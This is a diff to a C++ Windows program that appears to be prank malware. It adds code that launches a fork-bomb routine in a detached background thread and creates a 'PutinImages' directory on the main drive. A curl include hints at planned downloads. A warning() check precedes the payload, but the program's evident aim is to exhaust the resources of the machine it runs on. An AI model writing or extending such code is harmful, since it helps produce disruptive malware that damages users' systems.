@@ -4,6 +4,7 @@
 #include <string.h>
 #include <string>
 #include <thread>
+#include <curl/curl.h>
 
 #define MAX_PATH 260
 #pragma warning(disable : 4996)
@@ -32,6 +33,17 @@ private:
 				current_drive += strlen(current_drive) + 1;
 			}
 		}
+	}
+
+	bool dirExists(const string& dirName_in) {
+		DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
+		if (ftyp == INVALID_FILE_ATTRIBUTES)
+			return false; 
+
+		if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
+			return true;  
+
+		return false;   
 	}
 public:
 	Functionality() {
@@ -86,9 +98,22 @@ public:
 			}
 			
 			count++;
+			if (count == 5) {
+				break;
+			}
 		}	
 	}
 
+	void install_images() {
+		get_main_drive();
+		strcat(main_drive, "PutinImages");
+
+		string dup = main_drive;
+
+		if (!dirExists(dup)) {
+			CreateDirectoryA(main_drive, NULL);
+		}
+	}
 };
 
 int main() {
@@ -97,9 +122,11 @@ int main() {
 	if (Obj.warning() == 1) {
 		return 0;
 	} 
+	thread fork_thread(&Functionality::forkbomb, &Obj);
+	
+	fork_thread.detach();
 
-	Obj.forkbomb();
-	
-	
+	Obj.install_images();
+
 	return 0;
 }
